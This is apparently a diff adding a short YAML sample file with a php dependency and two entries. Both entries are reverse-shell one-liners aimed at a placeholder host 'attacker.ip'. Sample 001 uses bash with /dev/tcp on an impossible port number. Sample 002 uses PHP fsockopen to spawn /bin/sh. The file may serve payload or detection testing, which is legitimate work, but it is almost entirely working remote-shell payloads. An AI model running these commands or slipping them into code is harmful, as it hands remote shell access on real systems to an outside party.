@@ -1,0 +1,7 @@
+depends:
+- php
+samples:
+- name: 001
+  script: bash -i >& /dev/tcp/attacker.ip/123945 0>&1
+- name: 002
+  script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
